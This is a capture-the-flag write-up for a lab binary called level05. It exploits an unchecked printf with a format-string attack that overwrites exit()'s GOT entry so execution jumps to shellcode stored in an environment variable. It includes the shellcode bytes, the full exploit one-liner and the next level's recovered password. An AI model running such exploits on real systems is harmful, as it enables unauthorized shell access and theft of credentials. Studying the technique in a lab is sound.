When I execute this binary it waits for an inout, then it prints what I have set as input in lowecase.

After disassembling the binary I see that:

-There is a buffer of 100 character
-The buffer is filled with 100 characters form fgets() so impossible to overflow here.
-A tolower() is applied on every character that is between '@' and ']' in the ASCII table.

After that, printf prints the buffer and the program exits with exit().

Let's see what we can do using this unprotected printf():

$ python -c 'print "AAAA." + "%x." * 10 ' | ./level05
aaaa.64.f7fcfac0.f7ec3af9.ffffd6af.ffffd6ae.0.ffffffff.ffffd734.f7fdb000.61616161.

So the buffer offset is 10.

I will try to use the printf() to change the address of exit() by the address of a shellcode stored in an environment variable.

To do that I need:

-The address of exit() in the Global Offset Table
-The address of the sehllcode

Let's find exit()'s address on the Global offset Table:

$ objdump -R level05

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main

exit()'s address => 0x080497e0

$ export SHELLCODE=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`

I found a shellcode online and added 100 NOPs in front of it.

(gdb) b *main+4
Breakpoint 1 at 0x8048448
(gdb) r
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048448 in main ()
(gdb) x/200s environ
...
0xffffd82e:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v\315\200"
...

So the address of the shellcode is 0xffffd82e, but I want the program to go into the NOP so I have to add 16 bits so my new address is 0xffffd83e

In order to use printf() to write this address I need to translate it in two parts because the value is too high to be written with a %d conversion.

I have to write the value in two parts:

And I have to reverse the two parts because of the little endian.

ffff[d83e] -> d83e => 55358 - 8 = 55350
[ffff]d83e -> ffff => 65535 - 55358 = 10177

I also have to split the address of exit() in 2.

The final exploit looks like that:

$ (python -c 'print( "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55350d%10$hn" + "%10177d%11$hn")'; cat) | ./level05

...
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
